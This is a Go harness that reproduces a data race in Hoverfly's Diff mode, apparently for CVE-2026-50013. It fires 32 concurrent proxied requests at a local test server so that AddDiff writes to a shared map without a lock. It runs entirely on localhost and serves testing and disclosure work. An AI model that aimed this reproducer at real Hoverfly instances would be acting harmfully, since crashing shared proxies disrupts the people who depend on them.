// Harness for CVE-2026-50013 (Hoverfly up to v1.12.7): in Diff mode,
// Hoverfly.AddDiff appends to the shared responsesDiff map without a lock,
// from the goroutine that serves each proxied request.
//
// Usage: ./hoverfly-diff-mode <diff> <differs>
//
//	<diff>     1 puts Hoverfly in Diff mode, 0 leaves it in Simulate mode
//	<differs>  1 makes the real server answer differently from the simulation,
//	           0 makes it answer exactly as simulated
//
// The map race needs diff == 1 and differs == 1: AddDiff only writes the map
// when the diff report of a request has at least one entry. Diff mode alone
// already races on the DiffMode fields that all requests share.
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strconv"
	"sync"

	hv "github.com/SpectoLabs/hoverfly/core"
	v2 "github.com/SpectoLabs/hoverfly/core/handlers/v2"
	"github.com/SpectoLabs/hoverfly/core/modes"
	log "github.com/sirupsen/logrus"
)

const (
	requests  = 32
	simulated = "expected body"
)

func freePort() (string, error) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return "", err
	}
	defer ln.Close()
	return strconv.Itoa(ln.Addr().(*net.TCPAddr).Port), nil
}

func main() {
	if len(os.Args) != 3 || (os.Args[1] != "0" && os.Args[1] != "1") || (os.Args[2] != "0" && os.Args[2] != "1") {
		fmt.Println("Usage: ./hoverfly-diff-mode <diff> <differs>")
		return
	}
	diff := os.Args[1] == "1"
	differs := os.Args[2] == "1"
	log.SetLevel(log.ErrorLevel)

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if differs {
			io.WriteString(w, "actual body "+r.URL.RawQuery)
			return
		}
		io.WriteString(w, simulated)
	}))
	defer upstream.Close()
	upstreamURL, _ := url.Parse(upstream.URL)

	port, err := freePort()
	if err != nil {
		fmt.Println("port:", err)
		return
	}
	cfg := hv.InitSettings()
	cfg.ProxyPort = port
	cfg.ListenOnHost = "127.0.0.1"
	hf := hv.NewHoverflyWithConfiguration(cfg)

	simulation := fmt.Sprintf(`{
	  "data": {
	    "pairs": [{
	      "request": {
	        "method": [{"matcher": "exact", "value": "GET"}],
	        "destination": [{"matcher": "exact", "value": %q}],
	        "path": [{"matcher": "exact", "value": "/bomb"}]
	      },
	      "response": {"status": 200, "body": %q}
	    }],
	    "globalActions": {"delays": []}
	  },
	  "meta": {"schemaVersion": "v5.2"}
	}`, upstreamURL.Host, simulated)
	var view v2.SimulationViewV5
	if err := json.Unmarshal([]byte(simulation), &view); err != nil {
		fmt.Println("simulation:", err)
		return
	}
	if result := hf.PutSimulation(view); result.Err != nil {
		fmt.Println("simulation:", result.Err)
		return
	}

	mode := modes.Simulate
	if diff {
		mode = modes.Diff
	}
	if err := hf.SetModeWithArguments(v2.ModeView{Mode: mode}); err != nil {
		fmt.Println("mode:", err)
		return
	}
	if err := hf.StartProxy(); err != nil {
		fmt.Println("proxy:", err)
		return
	}
	defer hf.StopProxy()

	proxyURL, _ := url.Parse("http://127.0.0.1:" + port)
	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}}

	var wg sync.WaitGroup
	for i := 0; i < requests; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			resp, err := client.Get(fmt.Sprintf("%s/bomb?i=%d", upstream.URL, i))
			if err == nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}(i)
	}
	wg.Wait()

	fmt.Printf("OK: %d diff reports\n", len(hf.GetDiff()))
}
